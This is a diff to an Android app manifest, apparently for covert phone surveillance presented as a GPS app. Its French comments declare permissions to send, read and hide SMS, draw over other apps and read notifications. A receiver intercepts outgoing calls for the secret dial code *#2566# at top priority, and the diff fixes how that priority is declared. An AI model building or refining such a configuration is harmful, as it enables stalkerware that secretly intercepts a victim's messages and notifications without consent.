@@ -1,6 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.bloom.gps">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <!-- ✅ SMS : ENVOYER, RECEVOIR, LIRE, CACHER -->
     <uses-permission android:name="android.permission.SEND_SMS" />
@@ -26,10 +25,10 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- ✅ NOUVELLE : SUPERPOSITION SUR LES AUTRES APPS -->
+    <!-- ✅ SUPERPOSITION SUR LES AUTRES APPS -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
-    <!-- ✅ NOUVELLE : LIRE LES NOTIFICATIONS -->
+    <!-- ✅ LIRE LES NOTIFICATIONS -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_NOTIFICATIONS" />
@@ -57,10 +56,9 @@
 
         <!-- ✅ INTERCEPTEUR CODE TÉLÉPHONE : *#2566# -->
         <receiver android:name=".DialCodeReceiver" android:exported="true">
-            <intent-filter>
+            <intent-filter android:priority="999">
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
                 <category android:name="android.intent.category.DEFAULT" />
-                <priority android:value="999" />
             </intent-filter>
         </receiver>
 
